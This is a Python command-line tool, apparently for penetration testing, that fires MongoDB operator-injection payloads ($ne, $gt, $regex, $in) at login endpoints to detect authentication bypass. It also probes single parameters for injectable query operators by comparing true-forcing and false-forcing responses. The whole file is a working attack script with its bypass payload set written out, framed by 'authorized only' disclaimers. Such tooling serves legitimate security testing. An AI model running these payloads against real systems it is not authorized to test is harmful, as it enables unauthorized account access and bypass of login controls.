#!/usr/bin/env python3
"""
nosqli_fuzz.py - control-baselined NoSQL operator-injection detector + auth-bypass tester (authorized only).

Two modes:
  * login  (default when --pass-field is given): fire the canonical operator auth-bypass payloads (MongoDB $ne/$gt/$regex/
            $in) in BOTH JSON and bracket-form encodings against a login endpoint, and decide "bypassed" against a learned
            baseline (wrong-creds response) so a flip to success is a real signal, not a guess.
  * detect (default otherwise): send a TRUE-forcing operator ([$ne]/[$gt]/[$regex]=.*) vs a FALSE-forcing control on one
            param and flag a steered difference in the response.

Low false-positive by design: it learns a bad-login baseline (and an optional good-login baseline via --valid-user/
--valid-pass), and prefers explicit --success/--fail markers over heuristics. A lone error is NOT reported as a bypass.

SAFE: send only to an endpoint you are authorized to test; on success it does NOT pivot or read data - it reports the
signal. Use your own/test accounts. Authorized targets only.

Usage:
  # auth-bypass test (learn success from a known-good login first = most reliable):
  python3 nosqli_fuzz.py --url https://t/api/login --user-field username --pass-field password \
      --valid-user me --valid-pass mypass
  # or define success explicitly:
  python3 nosqli_fuzz.py --url https://t/api/login --user-field username --pass-field password --success '"token"'
  # operator-injection detection on a search param:
  python3 nosqli_fuzz.py --url "https://t/api/search" --param q --method GET
"""
import argparse, json, re, sys, urllib.request, urllib.parse, urllib.error


def send(url, method, headers, body_bytes, timeout):
    req = urllib.request.Request(url, data=body_bytes, method=method, headers=dict(headers))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), (e.read() if hasattr(e, "read") else b"")
    except Exception as e:
        return None, {}, f"__ERR__ {type(e).__name__}: {e}".encode()


def to_form(payload):
    """flatten {'u':{'$ne':None}} -> u[$ne]=  (bracket notation)."""
    pairs = []
    def walk(prefix, val):
        if isinstance(val, dict):
            for k, v in val.items():
                walk(f"{prefix}[{k}]", v)
        elif isinstance(val, list):
            for v in val:
                walk(f"{prefix}[]", v)
        else:
            pairs.append((prefix, "" if val is None else str(val)))
    for k, v in payload.items():
        walk(k, v)
    return urllib.parse.urlencode(pairs).encode()


def encode(payload, as_json):
    if as_json:
        return json.dumps(payload).encode(), {"Content-Type": "application/json"}
    return to_form(payload), {"Content-Type": "application/x-www-form-urlencoded"}


def cookies(headers):
    return headers.get("Set-Cookie", "") if headers else ""


def sig(resp):
    st, hd, bd = resp
    return (st, len(bd or b""), bool(re.search(r"(sess|sid|token|auth|jwt)", cookies(hd), re.I)))


def bypass_payloads(uf, pf):
    """(label, dict-payload) canonical auth-bypass set; encoded as JSON and form."""
    return [
        ("{$ne:null}/{$ne:null}", {uf: {"$ne": None}, pf: {"$ne": None}}),
        ("{$gt:''}/{$gt:''}",     {uf: {"$gt": ""},   pf: {"$gt": ""}}),
        ("user=admin,pass{$ne}",  {uf: "admin",        pf: {"$ne": "x8_nomatch"}}),
        ("user=admin,pass{$regex}", {uf: "admin",      pf: {"$regex": "^"}}),
        ("{$in:admins}/{$ne}",    {uf: {"$in": ["admin", "administrator", "root"]}, pf: {"$ne": "x8_nomatch"}}),
        ("{$ne}/{$regex:.*}",     {uf: {"$ne": None},  pf: {"$regex": ".*"}}),
    ]


def looks_success(resp, bad, good, success_re, fail_re):
    st, hd, bd = resp
    text = (bd or b"").decode("utf-8", "replace")
    if st is None or text.startswith("__ERR__"):
        return False, "request error"
    if success_re:
        return (re.search(success_re, text) is not None), f"success-marker /{success_re}/"
    if fail_re:
        ok = (re.search(fail_re, text) is None) and (st < 400)
        return ok, f"no fail-marker /{fail_re}/ and status<400"
    if good:
        gst, glen, gck = good
        ok = (st == gst) and (sig(resp)[2] == gck) and (st < 400)
        return ok, "matches good-login baseline"
    # heuristic vs bad baseline (labeled LIKELY by caller)
    bst, blen, bck = bad
    reasons = []
    if st != bst and st is not None and st < 400:
        reasons.append(f"status {bst}->{st}")
    if sig(resp)[2] and not bck:
        reasons.append("new session cookie")
    if abs(sig(resp)[1] - blen) > max(40, int(blen * 0.5)):
        reasons.append(f"len {blen}->{sig(resp)[1]}")
    return (len(reasons) > 0), "; ".join(reasons) or "no change vs bad baseline"


def mode_login(a):
    url = a.url
    hdr_extra = dict(h.split(":", 1) for h in a.header) if a.header else {}
    as_json_options = [True, False] if a.encoding == "both" else [a.encoding == "json"]

    def post(payload, as_json):
        body, ct = encode(payload, as_json)
        return send(url, a.method, {**ct, **hdr_extra}, body, a.timeout)

    # baselines
    bad = sig(post({a.user_field: "nosuchuser_x8b1t", a.pass_field: "wrongpass_x8b1t"}, True))
    good = None
    if a.valid_user and a.valid_pass:
        good = sig(post({a.user_field: a.valid_user, a.pass_field: a.valid_pass}, True))
        print(f"[i] good-login baseline: status={good[0]} len={good[1]} cookie={good[2]}")
    print(f"[i] bad-login  baseline: status={bad[0]} len={bad[1]} cookie={bad[2]}\n")

    hits = 0
    for as_json in as_json_options:
        enc = "JSON" if as_json else "form[bracket]"
        for label, payload in bypass_payloads(a.user_field, a.pass_field):
            resp = post(payload, as_json)
            ok, why = looks_success(resp, bad, good, a.success, a.fail)
            strong = bool(a.success or a.fail or good)
            if ok:
                hits += 1
                tag = "BYPASS" if strong else "LIKELY-BYPASS"
                print(f"  [{tag}] ({enc}) {label}")
                print(f"      status={resp[0]} len={len(resp[2] or b'')} cookie={sig(resp)[2]}  reason: {why}")
            elif a.verbose:
                print(f"  [no]     ({enc}) {label}  ({why})")
    print(f"\n[i] {hits} bypass signal(s). "
          + ("Confirm by logging in fresh with the payload and checking WHICH user you are."
             if hits else "No bypass detected with current baselines/markers."))
    return 0


def mode_detect(a):
    # operator differential on one param (GET query or POST body)
    hdr_extra = dict(h.split(":", 1) for h in a.header) if a.header else {}
    p = a.param
    trues = [(f"{p}[$ne]=x8_nomatch", {p: {"$ne": "x8_nomatch"}}),
             (f"{p}[$gt]=", {p: {"$gt": ""}}),
             (f"{p}[$regex]=.*", {p: {"$regex": ".*"}})]
    falses = [(f"{p}[$gt]=zzzzzz", {p: {"$gt": "zzzzzzzzzz"}}),
              (f"{p}[$regex]=^$", {p: {"$regex": "^$x8"}}),
              (f"{p}[$in]=[]", {p: {"$in": []}})]

    def fire(payload):
        if a.method.upper() == "GET":
            q = urllib.parse.urlencode([(k, "" if v is None else v) for k, v in
                                        [(kk, vv) for kk, vv in _flatten(payload)]])
            u = a.url + ("&" if "?" in a.url else "?") + q
            return send(u, "GET", hdr_extra, None, a.timeout)
        body, ct = encode(payload, a.encoding != "form")
        return send(a.url, a.method, {**ct, **hdr_extra}, body, a.timeout)

    base = sig(fire({p: "x8_baseline_value"}))
    print(f"[i] baseline (plain string): status={base[0]} len={base[1]}\n")
    t_sigs = [(lbl, sig(fire(pl))) for lbl, pl in trues]
    f_sigs = [(lbl, sig(fire(pl))) for lbl, pl in falses]
    for lbl, s in t_sigs:
        print(f"  TRUE-force  {lbl:24} -> status={s[0]} len={s[1]}")
    for lbl, s in f_sigs:
        print(f"  FALSE-force {lbl:24} -> status={s[0]} len={s[1]}")
    # verdict: any true differs from baseline AND from a false in a consistent direction
    t_lens = {s[1] for _, s in t_sigs}
    f_lens = {s[1] for _, s in f_sigs}
    steered = (t_lens != f_lens) and (t_lens != {base[1]} or f_lens != {base[1]})
    print("\n[verdict] " + ("OPERATOR INJECTION LIKELY - TRUE vs FALSE responses differ; verify the steer maps to data."
                            if steered else "no consistent TRUE/FALSE difference - probably not injectable here."))
    return 0


def _flatten(payload):
    out = []
    def walk(prefix, val):
        if isinstance(val, dict):
            for k, v in val.items():
                walk(f"{prefix}[{k}]", v)
        elif isinstance(val, list):
            if not val:
                out.append((f"{prefix}[]", ""))
            for v in val:
                walk(f"{prefix}[]", v)
        else:
            out.append((prefix, "" if val is None else str(val)))
    for k, v in payload.items():
        walk(k, v)
    return out


def main():
    ap = argparse.ArgumentParser(description="NoSQL operator-injection detector + auth-bypass tester (authorized only).")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--encoding", choices=["json", "form", "both"], default="both", help="body encoding to try (login mode)")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value' (repeatable)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--verbose", action="store_true")
    # login mode
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", help="password field name -> enables LOGIN mode")
    ap.add_argument("--valid-user", help="a known-good username (learns success baseline; most reliable)")
    ap.add_argument("--valid-pass", help="a known-good password")
    ap.add_argument("--success", help="regex that marks a SUCCESSFUL login in the body")
    ap.add_argument("--fail", help="regex that marks a FAILED login in the body")
    # detect mode
    ap.add_argument("--param", help="single parameter to operator-diff -> enables DETECT mode")
    a = ap.parse_args()

    if a.pass_field:
        return mode_login(a)
    if a.param:
        return mode_detect(a)
    sys.exit("[!] give --pass-field (login mode) or --param (detect mode)")


if __name__ == "__main__":
    sys.exit(main())
